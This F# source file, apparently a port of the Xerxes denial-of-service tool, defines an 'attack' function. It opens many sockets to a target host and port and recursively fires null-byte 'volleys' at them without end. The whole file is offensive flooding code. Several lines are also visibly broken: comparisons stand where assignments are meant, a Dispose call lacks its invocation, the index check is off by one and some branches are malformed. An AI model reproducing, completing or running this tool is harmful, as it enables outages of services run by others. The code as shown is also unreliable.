#nowarn "20"

namespace sultan

open sultan
open sultan.printxlib

open socklib

open System
open System.IO
open System.Net
open System.Text
open System.Net.Sockets
open System.Collections.Generic

module xerxeslib =
    let nil : string = string (char 0x00)

    let rec sendnul (host : string) (port : int) (sockets : List<Socket>) (index : int) (number : int)  =
        let request : byte array = Encoding.ASCII.GetBytes (nil)
        let socket = sockets.[index]
        let newIndex = 0
        let r = socket.Send(request)
        if r = -1 then
            socket.Close()
            socket = socketutil.connect(host, port)
            else
                socket.Dispose
                false
        verbose ("volley [" + (number.ToString()) + "] fired\n")
        if (index + 1) > sockets.Count then
            newIndex = 0
            else
                newIndex = (index + 1)
                false
        sendnul host port sockets newIndex (number + 1)

    let attack (host : string) (port : int) (id : int) (connections : int) =
        let sockets : List<Socket>= new List<Socket>()
        for i = 0 to connections do
            sockets.Add(socketutil.connect(host, port))
        let g : int = 1
        let r : int = 0
        sendnul host port sockets 0 1
